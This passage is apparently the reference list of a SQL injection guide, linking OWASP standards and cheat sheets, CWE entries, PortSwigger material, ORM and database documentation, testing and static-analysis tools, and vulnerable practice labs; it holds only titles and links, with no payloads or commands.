- ASVS 5.0: [V1 Encoding and Sanitization](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x10-V1-Encoding-and-Sanitization.md), [V2 Validation and Business Logic](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x11-V2-Validation-and-Business-Logic.md), [V16 Security Logging and Error Handling](https://github.com/OWASP/ASVS/blob/master/5.0/en/0x25-V16-Security-Logging-and-Error-Handling.md)
- [A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/); [API10:2023 Unsafe Consumption of APIs](https://api-security.owasp.org/editions/2023/en/0xaa-unsafe-consumption-of-apis/), [API8:2023 Security Misconfiguration](https://api-security.owasp.org/editions/2023/en/0xa8-security-misconfiguration/)
- Cheat Sheets: [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html), [Database Security](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html), [Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html), [Error Handling](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html), [GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- Community pages: [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)

**CWE**

- [CWE-89](https://cwe.mitre.org/data/definitions/89.html), [CWE-564](https://cwe.mitre.org/data/definitions/564.html), [CWE-943](https://cwe.mitre.org/data/definitions/943.html), [CWE-209](https://cwe.mitre.org/data/definitions/209.html), [CWE-155](https://cwe.mitre.org/data/definitions/155.html)

**PortSwigger**

- [SQL injection](https://portswigger.net/web-security/sql-injection) (including SQL injection in different parts of the query and second-order SQL injection), [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator); research: [Backslash Powered Scanning](https://portswigger.net/research/backslash-powered-scanning-hunting-unknown-vulnerability-classes)

**ORM and framework documentation**

- Django: [Performing raw SQL queries](https://docs.djangoproject.com/en/stable/topics/db/sql/), [QuerySet API](https://docs.djangoproject.com/en/stable/ref/models/querysets/) (`extra()` as a last resort), [Query expressions](https://docs.djangoproject.com/en/stable/ref/models/expressions/) (`RawSQL`), [Security in Django](https://docs.djangoproject.com/en/stable/topics/security/), [security advisories archive](https://docs.djangoproject.com/en/dev/releases/security/); DRF [filtering](https://www.django-rest-framework.org/api-guide/filtering/) (`ordering_fields`)
- Node.js: [node-postgres queries](https://node-postgres.com/features/queries), [mysql2 prepared statements](https://sidorares.github.io/node-mysql2/docs/documentation/prepared-statements), [Prisma raw queries](https://www.prisma.io/docs/orm/prisma-client/using-raw-sql/raw-queries), [Sequelize raw queries](https://sequelize.org/docs/v6/core-concepts/raw-queries/), [Knex raw](https://knexjs.org/guide/raw.html)
- Spring and Java: [JdbcTemplate](https://docs.spring.io/spring-framework/reference/data-access/jdbc/core.html), [Spring Data JPA query methods](https://docs.spring.io/spring-data/jpa/reference/jpa/query-methods.html) (`Sort`, `JpaSort.unsafe`), [Hibernate Query Language guide](https://docs.jboss.org/hibernate/orm/6.6/querylanguage/html_single/Hibernate_Query_Language.html)
- Laravel: [Database: Query Builder](https://laravel.com/docs/13.x/queries) (raw expressions, column-name binding warning)
- Databases: [PostgreSQL PL/pgSQL basic statements](https://www.postgresql.org/docs/current/plpgsql-statements.html) (`EXECUTE … USING`, `format('%I')`), [SQL Server sp_executesql](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-executesql-transact-sql), [QUOTENAME](https://learn.microsoft.com/en-us/sql/t-sql/functions/quotename-transact-sql), [MySQL information functions](https://dev.mysql.com/doc/refman/8.4/en/information-functions.html)
- Research: SonarSource, [Exploiting Hibernate Injections](https://www.sonarsource.com/blog/exploiting-hibernate-injections/)

**Tools**

- [sqlmap](https://sqlmap.org/) ([GitHub](https://github.com/sqlmapproject/sqlmap), [usage guide](https://github.com/sqlmapproject/sqlmap/wiki/Usage))
- [interactsh](https://github.com/projectdiscovery/interactsh)
- Burp extensions: [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943), [Backslash Powered Scanner](https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8), [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- Static analysis: [CodeQL js/sql-injection](https://codeql.github.com/codeql-query-help/javascript/js-sql-injection/), [py/sql-injection](https://codeql.github.com/codeql-query-help/python/py-sql-injection/), [java/sql-injection](https://codeql.github.com/codeql-query-help/java/java-sql-injection/), [java/concatenated-sql-query](https://codeql.github.com/codeql-query-help/java/java-concatenated-sql-query/), [cs/sql-injection](https://codeql.github.com/codeql-query-help/csharp/cs-sql-injection/); [semgrep-rules](https://github.com/semgrep/semgrep-rules)
- Labs: [OWASP Juice Shop](https://github.com/juice-shop/juice-shop), [OWASP crAPI](https://github.com/OWASP/crAPI), [VAmPI](https://github.com/erev0s/VAmPI)
